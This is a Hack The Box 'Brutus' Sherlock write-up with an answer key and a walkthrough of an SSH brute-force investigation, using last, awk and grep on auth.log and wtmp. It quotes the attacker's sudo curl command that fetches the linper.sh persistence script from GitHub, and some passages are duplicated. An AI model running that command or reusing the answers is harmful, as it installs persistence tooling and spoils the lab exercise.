# [Brutus](https://app.hackthebox.com/sherlocks/Brutus) 

---

??? info "Answers"

    ??? note "Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?"
        65.2.161.68

    ??? note "The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?"
        root

    ??? note "Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact."
        2024-03-06 06:32:45

    ??? note "SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?"
        37

    ??? note "The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?"
        cyberjunkie

    ??? note "What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?"
        T1136.001

    ??? note "What time did the attacker's first SSH session end according to auth.log?"
        2024-03-06 06:37:24

    ??? note "The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?"
        /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
    
---


[Brutus Complete](https://labs.hackthebox.com/achievement/sherlock/2582863/631)

![Brutus Complete](../00-journal/Images/2025-09-06/brutuscomplete.png)

the zip files gives you 3 files, and auth.log, wtmp, and a python script for parsing the wtmp file.

So lets check these files. 

the "last" command prints previous logins that are logged in your /var/log/wtmp to the terminal but we can also specify a file with the -f flag.

the wtmp file records logins, logouts, reboots, and system runelvel changes.

It is important to note that my system time is in UTC format.


```
       Λ   ~/hackthebox/brutus   last -f ./wtmp
    cyberju* pts/1        65.2.161.68      Wed Mar  6 06:37    gone - no logout
    root     pts/1        65.2.161.68      Wed Mar  6 06:32 - 06:37  (00:04)
    root     pts/0        203.101.190.9    Wed Mar  6 06:19    gone - no logout
    reboot   system boot  6.2.0-1018-aws   Wed Mar  6 06:17   still running
    root     pts/1        203.101.190.9    Sun Feb 11 10:54 - 11:08  (00:13)
    root     pts/1        203.101.190.9    Sun Feb 11 10:41 - 10:41  (00:00)
    root     pts/0        203.101.190.9    Sun Feb 11 10:33 - 11:08  (00:34)
    root     pts/0        203.101.190.9    Thu Jan 25 11:15 - 12:34  (01:18)
    ubuntu   pts/0        203.101.190.9    Thu Jan 25 11:13 - 11:15  (00:01)
    reboot   system boot  6.2.0-1017-aws   Thu Jan 25 11:12 - 11:09 (16+23:57)

    wtmp begins Thu Jan 25 11:12:17 2024
```
So, without even reading the auth.log yet we can kind of guess that the answer to this one is going to be 65.2.161.68 because it's the only login from a different IP address, but that's not **evidence** of an attacker.

Typing ```less -S auth.log``` into the terminal will let us read the entire log, the -S flag make the text go off the screen instead of wrapping onto the next line.

That's nice for skimming through, but log files can get quite large so it would be easier if we could search through them for what we want.  That is where grep and awk come in.

```head``` is a command that shows you a specified number of lines from the top of a file.  for example ```head -5 auth.log``` will give me the first 5 lines of the auth.log.  Using ```head -1 auth.log``` I can print the first line of the file to get a peek at the syntax so I can awk it.

```
   Λ   ~/hackthebox/brutus   head -1 auth.log
Mar  6 06:18:01 ip-172-31-35-28 CRON[1119]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
   Λ   ~/hackthebox/brutus   awk '{print $5}' auth.log | sed 's/[\[\:].*//g' | sort | uniq -c
      1 chfn
    104 CRON
      3 groupadd
      1 passwd
    257 sshd
      6 sudo
      2 systemd
      8 systemd-logind
      1 useradd
      2 usermod
   Λ   ~/hackthebox/brutus

```

Typing ```less -S auth.log``` into the terminal will let us read the entire log, the -S flag make the text go off the screen instead of wrapping onto the next line.

That's nice for skimming through, but log files can get quite large so it would be easier if we could search through them for what we want.  That is where grep and awk come in.

```head``` is a command that shows you a specified number of lines from the top of a file.  for example ```head -5 auth.log``` will give me the first 5 lines of the auth.log.  Using ```head -1 auth.log``` I can print the first line of the file to get a peek at the syntax so I can awk it.

    ```
       Λ   ~/hackthebox/brutus   head -1 auth.log
    Mar  6 06:18:01 ip-172-31-35-28 CRON[1119]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
       Λ   ~/hackthebox/brutus   awk '{print $5}' auth.log | sed 's/[\[\:].*//g' | sort | uniq -c
          1 chfn
        104 CRON
          3 groupadd
          1 passwd
        257 sshd
          6 sudo
          2 systemd
          8 systemd-logind
          1 useradd
          2 usermod
       Λ   ~/hackthebox/brutus

    ```
---    

```
head -1 auth.log
Mar  6 06:18:01 ip-172-31-35-28 CRON[1119]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
```



??? example "```awk '{print $5}' auth.log | sed 's/[\[\:].*//g' | sort | uniq -c```"

     **`awk '{print $5}' auth.log`**

        * Splits each line by the spaces.
        * Prints the fifth field of this split.
        * For example, here are the fields on the first line:

            * `$1` = `Mar`
            * `$2` = `6`
            * `$3` = `06:18:01`
            * `$4` = `ip-172-31-35-28`
            * `$5` = `CRON[1119]:`

       So the output is things like `sshd[1234]:`, `CRON[1119]:`, `sudo:`, etc.

     **`sed 's/[\[\:].*//g'`**

           * A regex replace: “if you see a `[` or `:` and anything after it, delete it.”
           * That turns `CRON[1119]:` into `CRON`, `sshd[1234]:` into `sshd`, `sudo:` into `sudo`
           * Essentially, it strips PIDs and trailing colons, leaving just the program name.

     **`sort`**

        * Sorts the cleaned list alphabetically.
        * All the `CRON`s together, all the `sshd`s together, etc.

     **`uniq -c`**

        * Collapses consecutive identical lines (hence the need for `sort`).
        * Counts how many times each unique program name appeared.
        * The `-c` flag prefixes each with its count.

---

So now we can see some of the actions that are taking place in this log file; most relevant to us here being that there were 257 SSH attempts.  

Let's grep the log for SSH.
```grep sshd auth.log``` I can see many failed password SSH attempts from the IP address 65.2.161.68.  Evidence of a brute force *attempt* from that IP address, but let's dig a little further.  
If I pipe the output of that into grep again, I can begin to filter the log file down.

For example, with the -v use flag, I can have grep do the opposite of it's usual function, and instead omit entries from it's output.

```
   Λ   ~/hackthebox/brutus   grep sshd auth.log | grep -v pam_unix | grep -v Failed | grep -v preauth | grep -v Invalid
Mar  6 06:19:52 ip-172-31-35-28 sshd[1465]: AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys root SHA256:4vycLsDMzI+hyb9OP3wd18zIpyTqJmRq/QIZaLNrg8A failed, status 22
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: error: beginning MaxStartups throttling
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: drop connection #10 from [65.2.161.68]:46482 on [172.31.35.28]:22 past MaxStartups
Mar  6 06:31:36 ip-172-31-35-28 sshd[2357]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=backup
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Received disconnect from 65.2.161.68 port 34782:11: Bye Bye
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Disconnected from user root 65.2.161.68 port 34782
Mar  6 06:31:41 ip-172-31-35-28 sshd[2399]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=root
Mar  6 06:31:41 ip-172-31-35-28 sshd[2407]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=root
Mar  6 06:31:42 ip-172-31-35-28 sshd[2409]: PAM 1 more authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68  user=root
Mar  6 06:32:39 ip-172-31-35-28 sshd[620]: exited MaxStartups throttling after 00:01:08, 21 connections dropped
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
   Λ   ~/hackthebox/brutus

```

Now we get a clearer picture of what has happened.  Combined with our knowledge that there have been 257 SSH attempts, and before adding ```grep -v Failed | grep -v preauth | grep -v Invalid``` you could see that each of those 257 are all from **65.2.161.68**.


---

## Sources

[IppSec's Guide](https://www.youtube.com/watch?v=bv08UcIL1po)
